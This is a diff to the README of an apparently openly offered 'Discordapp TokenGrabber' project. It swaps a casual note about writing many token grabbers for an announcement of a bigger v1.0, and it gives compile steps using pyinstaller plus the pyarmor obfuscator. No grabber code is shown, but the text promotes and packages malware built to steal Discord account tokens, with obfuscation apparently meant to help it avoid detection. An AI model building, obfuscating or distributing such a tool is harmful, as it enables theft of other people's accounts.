@@ -1,5 +1,5 @@
 # Discordapp TokenGrabber
-  - Reeeeee, i made so many token grabbers and i cant do duplicate names ): \ Anyways here you go a nice discord token grabber
+  - Deploying a v1.0 version soon, includes way more things than the actual one 
 
 # How to compile
  - in command prompt: `pip install pyinstaller` & `pip install pyarmor`
